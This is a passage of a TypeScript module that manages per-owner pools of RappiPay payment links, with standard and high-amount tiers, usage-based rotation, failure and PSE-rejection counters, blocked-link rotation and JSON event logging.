      : getRappiHighAmountThreshold(ownerId);

  const slotMap = new Map<1 | 2 | 3 | 4 | 5, string>();
  for (const entry of slotsInput || []) {
    const slotNum = Number(entry?.slot);
    if (slotNum >= 1 && slotNum <= 5) {
      slotMap.set(slotNum as 1 | 2 | 3 | 4 | 5, String(entry?.url || '').trim());
    }
  }

  const nextUserItems: RappiLinkItem[] = [];
  const validSlots: (1 | 2 | 3 | 4 | 5)[] = [1, 2, 3, 4, 5];

  for (const slot of validSlots) {
    const tier: RappiLinkTier = slot >= 4 ? 'high_amount' : 'standard';
    const cleanUrl = (slotMap.get(slot) || '').trim();
    if (!cleanUrl) continue;

    const existingSameSlot = existingUserItems.find(
      (p) => p.slot === slot && p.url.trim().toLowerCase() === cleanUrl.toLowerCase()
    );
    const existingSameUrl =
      existingSameSlot ||
      existingUserItems.find(
        (p) => getLinkTier(p) === tier && p.url.trim().toLowerCase() === cleanUrl.toLowerCase()
      );

    if (existingSameUrl) {
      nextUserItems.push({
        ...existingSameUrl,
        ownerId,
        slot,
        tier,
        url: cleanUrl,
      });
    } else {
      const info = detectGatewayFromUrl(cleanUrl);
      nextUserItems.push({
        id: `RPL_${Date.now()}_S${slot}_${Math.random().toString(36).slice(2, 5).toUpperCase()}`,
        ownerId,
        slot,
        tier,
        url: cleanUrl,
        linkCode: info.linkId || cleanUrl.split('/').pop() || `slot${slot}`,
        status: 'STANDBY',
        usesCount: 0,
        rotationUsesCount: 0,
        consecutiveFailures: 0,
        consecutivePseRejections: 0,
        addedAt: new Date().toISOString(),
      });
    }
  }

  // Garantizar exactamente 1 link ACTIVO por cada grupo (Estándar 1-3 y Montos Grandes 4-5)
  for (const tier of ['standard', 'high_amount'] as RappiLinkTier[]) {
    const tierItems = nextUserItems.filter((p) => getLinkTier(p) === tier);
    const nonBlocked = tierItems.filter((p) => p.status !== 'BLOCKED');
    const actives = nonBlocked.filter((p) => p.status === 'ACTIVE');
    if (actives.length === 0 && nonBlocked.length > 0) {
      nonBlocked[0].status = 'ACTIVE';
    } else if (actives.length > 1) {
      for (let i = 1; i < actives.length; i++) {
        actives[i].status = 'STANDBY';
      }
    }
  }

  const nextAllPool = [...otherUsersItems, ...nextUserItems];
  saveAllRappiPoolRaw(nextAllPool);

  const activeStandard = nextUserItems.find(
    (p) => getLinkTier(p) === 'standard' && p.status === 'ACTIVE'
  );
  const settingsPatch: Partial<GatewaySettings> = {
    rappiHighAmountThreshold: normalizedThreshold,
  };
  if (activeStandard) {
    settingsPatch.rappiUrl = activeStandard.url;
    const currentSettings = getGatewaySettings(ownerId);
    if (currentSettings.gatewayProvider === 'rappipay') {
      settingsPatch.paymentUrl = activeStandard.url;
    }
  }
  const updatedSettings = updateGatewaySettings(settingsPatch, ownerId);

  return {
    pool: getRappiLinksPool(ownerId),
    slots: getRappiPoolSlots(ownerId),
    settings: updatedSettings,
  };
}

export function getPoolSummary(userIdOrSlug?: string) {
  const pool = getRappiLinksPool(userIdOrSlug);
  const standardItems = pool.filter((p) => getLinkTier(p) === 'standard');
  const highItems = pool.filter((p) => getLinkTier(p) === 'high_amount');

  const activeStandard = standardItems.find((p) => p.status === 'ACTIVE');
  const activeHigh = highItems.find((p) => p.status === 'ACTIVE');

  const standardUsable = standardItems.filter((p) => p.status !== 'BLOCKED').length;
  const highUsable = highItems.filter((p) => p.status !== 'BLOCKED').length;
  const standbyCount = pool.filter((p) => p.status === 'STANDBY').length;
  const blockedCount = pool.filter((p) => p.status === 'BLOCKED').length;
  const activeTotal = standardUsable + highUsable;

  return {
    activeUrl: activeStandard?.url || null,
    activeHighAmountUrl: activeHigh?.url || null,
    activeTotal,
    standardActiveTotal: standardUsable,
    highAmountActiveTotal: highUsable,
    standbyCount,
    blockedCount,
    totalInPool: pool.length,
    highAmountThreshold: getRappiHighAmountThreshold(userIdOrSlug),
  };
}

export function getEffectiveRappiUrl(
  userIdOrSlug?: string,
  amount?: number | string
): { ownerId: string; url: string; tier: RappiLinkTier; slot?: number } {
  const ownerId = resolveOwnerId(userIdOrSlug);
  const settings = getGatewaySettings(ownerId);
  const pool = getRappiLinksPool(ownerId);
  const threshold = getRappiHighAmountThreshold(ownerId);
  const numericAmount = Number(String(amount ?? '0').replace(/[^\d]/g, '')) || 0;
  const isHighAmount = numericAmount >= threshold;

  const standardPool = pool.filter((p) => getLinkTier(p) === 'standard');
  const highPool = pool.filter((p) => getLinkTier(p) === 'high_amount');

  // 1. Si el monto es GRANDE (>= umbral, por defecto $1.000.000), usar EXCLUSIVAMENTE los 2 links aislados (Slots 4-5)
  if (isHighAmount) {
    const activeHigh = highPool.find((p) => p.status === 'ACTIVE');
    if (activeHigh) {
      return { ownerId, url: activeHigh.url, tier: 'high_amount', slot: activeHigh.slot };
    }
    const standbyHigh = highPool.find((p) => p.status === 'STANDBY');
    if (standbyHigh) {
      const allPool = getAllRappiPoolRaw();
      for (const item of allPool) {
        if ((item.ownerId || MASTER_ADMIN_ID) !== ownerId) continue;
        if (getLinkTier(item) !== 'high_amount') continue;
        if (item.id === standbyHigh.id) {
          item.status = 'ACTIVE';
        } else if (item.status === 'ACTIVE') {
          item.status = 'STANDBY';
        }
      }
      saveAllRappiPoolRaw(allPool);
      return { ownerId, url: standbyHigh.url, tier: 'high_amount', slot: standbyHigh.slot };
    }
    console.warn(
      `[RappiPool][${ownerId}] Monto grande ($${numericAmount.toLocaleString('es-CO')}) >= $${threshold.toLocaleString('es-CO')} pero no hay links de monto grande disponibles (Slots 4-5); usando link estándar como respaldo.`
    );
  }

  // 2. Montos normales (< umbral) o respaldo si no hay Slots 4-5: usar EXCLUSIVAMENTE links estándar (Slots 1-3)
  const activeStandard = standardPool.find((p) => p.status === 'ACTIVE');
  const configuredUrl = (settings.rappiUrl || settings.paymentUrl || '').trim();

  if (activeStandard) {
    if (configuredUrl.toLowerCase() !== activeStandard.url.trim().toLowerCase()) {
      updateGatewaySettings({ rappiUrl: activeStandard.url, paymentUrl: activeStandard.url }, ownerId);
    }
    return { ownerId, url: activeStandard.url, tier: 'standard', slot: activeStandard.slot };
  }

  const standbyStandard = standardPool.find((p) => p.status === 'STANDBY');
  if (standbyStandard) {
    const allPool = getAllRappiPoolRaw();
    for (const item of allPool) {
      if ((item.ownerId || MASTER_ADMIN_ID) !== ownerId) continue;
      if (getLinkTier(item) !== 'standard') continue;
      if (item.id === standbyStandard.id) {
        item.status = 'ACTIVE';
      } else if (item.status === 'ACTIVE') {
        item.status = 'STANDBY';
      }
    }
    saveAllRappiPoolRaw(allPool);
    updateGatewaySettings({ rappiUrl: standbyStandard.url, paymentUrl: standbyStandard.url }, ownerId);
    return { ownerId, url: standbyStandard.url, tier: 'standard', slot: standbyStandard.slot };
  }

  if (configuredUrl) {
    const inHigh = highPool.some((p) => p.url.trim().toLowerCase() === configuredUrl.toLowerCase());
    if (!inHigh && !isUrlBlockedForOwner(configuredUrl, ownerId)) {
      return { ownerId, url: configuredUrl, tier: 'standard' };
    }
  }

  const fallbackOwnerId = findMostRecentActiveOwnerId();
  if (fallbackOwnerId !== ownerId) {
    const fallbackPool = getRappiLinksPool(fallbackOwnerId).filter((p) => getLinkTier(p) === 'standard');
    const fallbackActive = fallbackPool.find((p) => p.status === 'ACTIVE' || p.status === 'STANDBY');
    if (fallbackActive) {
      return { ownerId: fallbackOwnerId, url: fallbackActive.url, tier: 'standard', slot: fallbackActive.slot };
    }
    const fallbackSettings = getGatewaySettings(fallbackOwnerId);
    const fallbackUrl = (fallbackSettings.rappiUrl || fallbackSettings.paymentUrl || '').trim();
    if (fallbackUrl && !isUrlBlockedForOwner(fallbackUrl, fallbackOwnerId)) {
      return { ownerId: fallbackOwnerId, url: fallbackUrl, tier: 'standard' };
    }
  }

  const anyActiveStandard = getAllRappiPoolRaw().find(
    (p) => getLinkTier(p) === 'standard' && p.status === 'ACTIVE'
  );
  if (anyActiveStandard) {
    return {
      ownerId: anyActiveStandard.ownerId || ownerId,
      url: anyActiveStandard.url,
      tier: 'standard',
      slot: anyActiveStandard.slot,
    };
  }

  return { ownerId, url: configuredUrl, tier: 'standard' };
}

function getAllLinkLogsRaw(): LinkEventLog[] {
  if (cachedLinkLogs) return cachedLinkLogs;
  ensureDataDir();
  if (fs.existsSync(LINK_LOGS_FILE)) {
    try {
      const raw = fs.readFileSync(LINK_LOGS_FILE, 'utf-8');
      const parsed = JSON.parse(raw) as LinkEventLog[];
      if (Array.isArray(parsed)) {
        if (normalizeLogReasons(parsed)) {
          try {
            fs.writeFileSync(LINK_LOGS_FILE, JSON.stringify(parsed, null, 2), 'utf-8');
          } catch {
            // ignore
          }
        }
        cachedLinkLogs = parsed;
        return cachedLinkLogs;
      }
    } catch {
      // ignore
    }
  }
  cachedLinkLogs = [];
  return cachedLinkLogs;
}

export function getLinkLogs(userIdOrSlug?: string): LinkEventLog[] {
  const ownerId = resolveOwnerId(userIdOrSlug);
  return getAllLinkLogsRaw().filter((l) => (l.ownerId || MASTER_ADMIN_ID) === ownerId);
}

export function recordLinkEvent(
  event: Omit<LinkEventLog, 'id' | 'createdAt' | 'activeRemaining' | 'blockedTotal'>,
  userIdOrSlug?: string
): LinkEventLog {
  const ownerId = resolveOwnerId(userIdOrSlug || event.ownerId);
  const allLogs = getAllLinkLogsRaw();
  const summary = getPoolSummary(ownerId);
  const entry: LinkEventLog = {
    ...event,
    ownerId,
    id: `LOG_${Date.now()}_${Math.random().toString(36).slice(2, 6).toUpperCase()}`,
    activeRemaining: summary.activeTotal,
    blockedTotal: summary.blockedCount,
    createdAt: new Date().toISOString(),
  };
  allLogs.unshift(entry);
  if (allLogs.length > 300) allLogs.length = 300;
  ensureDataDir();
  try {
    fs.writeFileSync(LINK_LOGS_FILE, JSON.stringify(allLogs, null, 2), 'utf-8');
  } catch {
    // ignore
  }
  cachedLinkLogs = allLogs;
  emitDashboardUpdate();
  return entry;
}

export function addRappiLinksToPool(
  rawUrls: string[],
  userIdOrSlug?: string,
  makeFirstActive = false
): RappiLinkItem[] {
  const ownerId = resolveOwnerId(userIdOrSlug);
  const allPool = getAllRappiPoolRaw();
  const userStandardPool = allPool.filter(
    (p) => (p.ownerId || MASTER_ADMIN_ID) === ownerId && getLinkTier(p) === 'standard'
  );
  let hasActive = makeFirstActive ? false : userStandardPool.some((p) => p.status === 'ACTIVE');

  if (makeFirstActive && rawUrls.some((u) => (u || '').trim().length > 0)) {
    for (const item of allPool) {
      if (
        (item.ownerId || MASTER_ADMIN_ID) === ownerId &&
        getLinkTier(item) === 'standard' &&
        item.status === 'ACTIVE'
      ) {
        item.status = 'STANDBY';
      }
    }
  }

  for (const raw of rawUrls) {
    const clean = (raw || '').trim();
    if (!clean) continue;
    const info = detectGatewayFromUrl(clean);
    const existing = allPool.find(
      (p) =>
        (p.ownerId || MASTER_ADMIN_ID) === ownerId &&
        getLinkTier(p) === 'standard' &&
        p.url.toLowerCase() === clean.toLowerCase()
    );
    if (existing) {
      if (makeFirstActive && !hasActive) {
        existing.status = 'ACTIVE';
        existing.blockedAt = undefined;
        existing.blockReason = undefined;
        existing.rotationUsesCount = 0;
        hasActive = true;
      } else if (existing.status === 'BLOCKED') {
        existing.status = hasActive ? 'STANDBY' : 'ACTIVE';
        existing.blockedAt = undefined;
        existing.blockReason = undefined;
        existing.rotationUsesCount = 0;
        if (existing.status === 'ACTIVE') hasActive = true;
      }
      continue;
    }

    const usedStdSlots = new Set<number>(
      allPool
        .filter((p) => (p.ownerId || MASTER_ADMIN_ID) === ownerId && getLinkTier(p) === 'standard')
        .map((p) => p.slot)
        .filter((s): s is 1 | 2 | 3 => s === 1 || s === 2 || s === 3)
    );
    const freeStdSlot = ([1, 2, 3] as const).find((s) => !usedStdSlots.has(s));

    const status: RappiLinkItem['status'] = hasActive ? 'STANDBY' : 'ACTIVE';
    if (status === 'ACTIVE') hasActive = true;

    allPool.push({
      id: `RPL_${Date.now()}_${Math.random().toString(36).slice(2, 6).toUpperCase()}`,
      ownerId,
      slot: freeStdSlot,
      tier: 'standard',
      url: clean,
      linkCode: info.linkId || clean.split('/').pop() || 'link',
      status,
      usesCount: 0,
      rotationUsesCount: 0,
      addedAt: new Date().toISOString(),
    });
  }

  saveAllRappiPoolRaw(allPool);

  const updatedUserPool = getRappiLinksPool(ownerId);
  const activeNow = updatedUserPool.find((p) => getLinkTier(p) === 'standard' && p.status === 'ACTIVE');
  if (activeNow) {
    const currentSettings = getGatewaySettings(ownerId);
    if (
      currentSettings.rappiUrl !== activeNow.url ||
      (currentSettings.gatewayProvider === 'rappipay' && currentSettings.paymentUrl !== activeNow.url)
    ) {
      updateGatewaySettings({ rappiUrl: activeNow.url, paymentUrl: activeNow.url }, ownerId);
    }
  }

  return updatedUserPool;
}

export function activateRappiLinkInPool(idOrUrl: string, userIdOrSlug?: string): RappiLinkItem[] {
  const ownerId = resolveOwnerId(userIdOrSlug);
  const allPool = getAllRappiPoolRaw();
  const target = allPool.find(
    (p) => (p.ownerId || MASTER_ADMIN_ID) === ownerId && (p.id === idOrUrl || p.url === idOrUrl)
  );
  if (!target) {
    throw new Error('Link no encontrado en tu cola.');
  }

  const targetTier = getLinkTier(target);
  for (const item of allPool) {
    if ((item.ownerId || MASTER_ADMIN_ID) !== ownerId) continue;
    if (getLinkTier(item) !== targetTier) continue;
    if (item.id === target.id) {
      item.status = 'ACTIVE';
      item.blockedAt = undefined;
      item.blockReason = undefined;
      item.consecutiveFailures = 0;
      item.consecutivePseRejections = 0;
      item.rotationUsesCount = 0;
    } else if (item.status === 'ACTIVE') {
      item.status = 'STANDBY';
    }
  }

  saveAllRappiPoolRaw(allPool);
  if (targetTier === 'standard') {
    updateGatewaySettings(
      { gatewayProvider: 'rappipay', rappiUrl: target.url, paymentUrl: target.url },
      ownerId
    );
  }
  return getRappiLinksPool(ownerId);
}

export function removeRappiLinkFromPool(idOrUrl: string, userIdOrSlug?: string): RappiLinkItem[] {
  const ownerId = resolveOwnerId(userIdOrSlug);
  let allPool = getAllRappiPoolRaw();
  const target = allPool.find(
    (p) => (p.ownerId || MASTER_ADMIN_ID) === ownerId && (p.id === idOrUrl || p.url === idOrUrl)
  );
  const targetTier = getLinkTier(target);
  allPool = allPool.filter(
    (p) => !((p.ownerId || MASTER_ADMIN_ID) === ownerId && (p.id === idOrUrl || p.url === idOrUrl))
  );

  if (target?.status === 'ACTIVE') {
    const nextStandby = allPool.find(
      (p) =>
        (p.ownerId || MASTER_ADMIN_ID) === ownerId &&
        getLinkTier(p) === targetTier &&
        p.status === 'STANDBY'
    );
    if (nextStandby) {
      nextStandby.status = 'ACTIVE';
      if (targetTier === 'standard') {
        updateGatewaySettings({ rappiUrl: nextStandby.url, paymentUrl: nextStandby.url }, ownerId);
      }
    }
  }

  saveAllRappiPoolRaw(allPool);
  return getRappiLinksPool(ownerId);
}

export function incrementRappiLinkUse(
  url: string,
  userIdOrSlug?: string,
  countForRotation = true
): { rotatedTo: string | null; tier: RappiLinkTier; rotationUsesCount: number; rotateEvery: number } {
  const ownerId = resolveOwnerId(userIdOrSlug);
  const allPool = getAllRappiPoolRaw();
  const clean = (url || '').trim().toLowerCase();
  const found = allPool.find(
    (p) => (p.ownerId || MASTER_ADMIN_ID) === ownerId && p.url.toLowerCase() === clean
  );
  if (!found) {
    return { rotatedTo: null, tier: 'standard', rotationUsesCount: 0, rotateEvery: STANDARD_ROTATE_EVERY };
  }

  const tier = getLinkTier(found);
  const rotateEvery = getTierRotateEvery(tier);
  found.usesCount = (found.usesCount || 0) + 1;
  found.consecutiveFailures = 0;

  let reactivatedAsActive = false;
  if (found.status === 'BLOCKED') {
    const hasOtherActiveInTier = allPool.some(
      (p) =>
        (p.ownerId || MASTER_ADMIN_ID) === ownerId &&
        getLinkTier(p) === tier &&
        p.id !== found.id &&
        p.status === 'ACTIVE'
    );
    found.status = hasOtherActiveInTier ? 'STANDBY' : 'ACTIVE';
    found.blockedAt = undefined;
    found.blockReason = undefined;
    reactivatedAsActive = found.status === 'ACTIVE';
  }

  let rotatedTo: string | null = null;
  let rotatedFromSlot = found.slot;
  let rotatedToSlot: number | undefined;

  if (countForRotation) {
    found.rotationUsesCount = (found.rotationUsesCount || 0) + 1;

    if (found.rotationUsesCount >= rotateEvery) {
      const eligibleInTier = allPool
        .filter(
          (p) =>
            (p.ownerId || MASTER_ADMIN_ID) === ownerId &&
            getLinkTier(p) === tier &&
            p.status !== 'BLOCKED'
        )
        .sort((a, b) => (a.slot || 99) - (b.slot || 99));

      if (eligibleInTier.length > 1) {
        const currentIndex = eligibleInTier.findIndex((p) => p.id === found.id);
        const nextItem = eligibleInTier[(currentIndex + 1) % eligibleInTier.length];

        for (const item of eligibleInTier) {
          if (item.id === nextItem.id) {
            item.status = 'ACTIVE';
            item.rotationUsesCount = 0;
          } else {
            item.status = 'STANDBY';
            if (item.id === found.id) {
              item.rotationUsesCount = 0;
            }
          }
        }
        rotatedTo = nextItem.url;
        rotatedToSlot = nextItem.slot;
      } else {
        // Solo hay 1 link disponible en este grupo; reiniciar ciclo y mantenerlo activo
        found.rotationUsesCount = 0;
      }
    }
  }

  saveAllRappiPoolRaw(allPool);

  if (rotatedTo) {
    if (tier === 'standard') {
      const currentSettings = getGatewaySettings(ownerId);
      if (currentSettings.rappiUrl !== rotatedTo) {
        updateGatewaySettings({ rappiUrl: rotatedTo, paymentUrl: rotatedTo }, ownerId);
      }
    }
    const tierLabel = tier === 'high_amount' ? 'Montos Grandes (≥$1M)' : 'Estándar';
    const slotNote =
      rotatedFromSlot && rotatedToSlot ? ` (Slot ${rotatedFromSlot} → Slot ${rotatedToSlot})` : '';
    console.log(
      `[Auto-Rotación por Uso][${ownerId}] 🔄 ${tierLabel} (${rotateEvery}/${rotateEvery} redirecciones)${slotNote}: ${found.url} -> ${rotatedTo}`
    );
    recordLinkEvent(
      {
        type: 'ROTATED',
        gateway: 'rappipay',
        url: found.url,
        nextUrl: rotatedTo,
        reason: `Rotación automática ${tierLabel} cada ${rotateEvery} redirección(es)${slotNote}.`,
      },
      ownerId
    );
  } else if (reactivatedAsActive && tier === 'standard') {
    const currentSettings = getGatewaySettings(ownerId);
    if (currentSettings.rappiUrl !== found.url) {
      updateGatewaySettings({ rappiUrl: found.url, paymentUrl: found.url }, ownerId);
    }
  }

  return {
    rotatedTo,
    tier,
    rotationUsesCount: found.rotationUsesCount || 0,
    rotateEvery,
  };
}

export function recordRappiLinkFailure(
  url: string,
  userIdOrSlug?: string
): { consecutiveFailures: number; item: RappiLinkItem | null } {
  const ownerId = resolveOwnerId(userIdOrSlug);
  const cleanUrl = (url || '').trim();
  if (!cleanUrl) return { consecutiveFailures: 1, item: null };

  const allPool = getAllRappiPoolRaw();
  let found = allPool.find(
    (p) => (p.ownerId || MASTER_ADMIN_ID) === ownerId && p.url.toLowerCase() === cleanUrl.toLowerCase()
  );
  if (!found) {
    const info = detectGatewayFromUrl(cleanUrl);
    const hasActive = allPool.some(
      (p) => (p.ownerId || MASTER_ADMIN_ID) === ownerId && p.status === 'ACTIVE'
    );
    found = {
      id: `RPL_${Date.now()}_${Math.random().toString(36).slice(2, 6).toUpperCase()}`,
      ownerId,
      url: cleanUrl,
      linkCode: info.linkId || cleanUrl.split('/').pop() || 'rappi',
      status: hasActive ? 'STANDBY' : 'ACTIVE',
      usesCount: 0,
      consecutiveFailures: 0,
      addedAt: new Date().toISOString(),
    };
    allPool.push(found);
  }

  found.consecutiveFailures = (found.consecutiveFailures || 0) + 1;
  saveAllRappiPoolRaw(allPool);
  return { consecutiveFailures: found.consecutiveFailures, item: found };
}

export function recordRappiPseRejection(
  url: string,
  userIdOrSlug?: string
): { consecutivePseRejections: number; item: RappiLinkItem | null } {
  const ownerId = resolveOwnerId(userIdOrSlug);
  const cleanUrl = (url || '').trim();
  if (!cleanUrl) return { consecutivePseRejections: 1, item: null };

  const allPool = getAllRappiPoolRaw();
  const found = allPool.find(
    (p) => (p.ownerId || MASTER_ADMIN_ID) === ownerId && p.url.toLowerCase() === cleanUrl.toLowerCase()
  );
  if (!found) {
    return { consecutivePseRejections: 1, item: null };
  }

  found.consecutivePseRejections = (found.consecutivePseRejections || 0) + 1;
  saveAllRappiPoolRaw(allPool);
  return { consecutivePseRejections: found.consecutivePseRejections, item: found };
}

export function resetRappiPseRejections(url: string, userIdOrSlug?: string): void {
  const ownerId = resolveOwnerId(userIdOrSlug);
  const cleanUrl = (url || '').trim().toLowerCase();
  if (!cleanUrl) return;
  const allPool = getAllRappiPoolRaw();
  const found = allPool.find(
    (p) => (p.ownerId || MASTER_ADMIN_ID) === ownerId && p.url.toLowerCase() === cleanUrl
  );
  if (found && (found.consecutivePseRejections || 0) > 0) {
    found.consecutivePseRejections = 0;
    saveAllRappiPoolRaw(allPool);
  }
}

export function markLinkBlockedAndRotate(
  blockedUrl: string,
  reason: string,
  gateway: GatewayProvider = 'rappipay',
  userIdOrSlug?: string
): {
  rotatedTo: string | null;
  activeRemaining: number;
  blockedTotal: number;
  logEntry: LinkEventLog;
} {
  const ownerId = resolveOwnerId(userIdOrSlug);
  const cleanBlocked = (blockedUrl || '').trim();
  const shortReason = formatShortBlockReason(reason);
  const allPool = getAllRappiPoolRaw();

  if (gateway === 'rappipay') {
    let target = allPool.find(
      (p) =>
        (p.ownerId || MASTER_ADMIN_ID) === ownerId &&
        p.url.toLowerCase() === cleanBlocked.toLowerCase()
    );
    if (!target && cleanBlocked) {
      const info = detectGatewayFromUrl(cleanBlocked);
      target = {
        id: `RPL_${Date.now()}`,
        ownerId,
        url: cleanBlocked,
        linkCode: info.linkId || 'rappi',
        status: 'BLOCKED',
        usesCount: 1,
        addedAt: new Date().toISOString(),
      };
      allPool.push(target);
    }
    if (target) {
      target.status = 'BLOCKED';
      target.blockedAt = new Date().toISOString();
      target.blockReason = shortReason;
      target.rotationUsesCount = 0;
    }

    const targetTier = getLinkTier(target);
    const nextCandidate = allPool
      .filter(
        (p) =>
          (p.ownerId || MASTER_ADMIN_ID) === ownerId &&
          getLinkTier(p) === targetTier &&
          (p.status === 'STANDBY' || p.status === 'ACTIVE') &&
          p.url.toLowerCase() !== cleanBlocked.toLowerCase()
      )
      .sort((a, b) => (a.slot || 99) - (b.slot || 99))[0];

    let rotatedTo: string | null = null;
    if (nextCandidate) {
      for (const item of allPool) {
        if ((item.ownerId || MASTER_ADMIN_ID) !== ownerId) continue;
        if (getLinkTier(item) !== targetTier) continue;
        if (item.id === nextCandidate.id) {
          item.status = 'ACTIVE';
          item.rotationUsesCount = 0;
        } else if (item.status === 'ACTIVE') {
          item.status = 'STANDBY';
        }
      }
      rotatedTo = nextCandidate.url;
      if (targetTier === 'standard') {
        updateGatewaySettings(
          {
            gatewayProvider: 'rappipay',
            rappiUrl: rotatedTo,
            paymentUrl: rotatedTo,
          },
          ownerId
        );
      }
    }

    saveAllRappiPoolRaw(allPool);
    const summary = getPoolSummary(ownerId);
    const logEntry = recordLinkEvent(
      {
        type: rotatedTo ? 'ROTATED' : 'BLOCKED',
        gateway,
        url: cleanBlocked,
        nextUrl: rotatedTo || undefined,
        reason: shortReason,
      },
      ownerId
    );

    return {
      rotatedTo,
      activeRemaining: summary.activeTotal,
      blockedTotal: summary.blockedCount,
      logEntry,
    };
  }

  const summary = getPoolSummary(ownerId);
  const logEntry = recordLinkEvent(
    {
      type: 'BLOCKED',
      gateway,
      url: cleanBlocked,
      reason: shortReason,
    },
    ownerId
  );

  return {
    rotatedTo: null,
    activeRemaining: summary.activeTotal,
    blockedTotal: summary.blockedCount + 1,
    logEntry,
  };
}
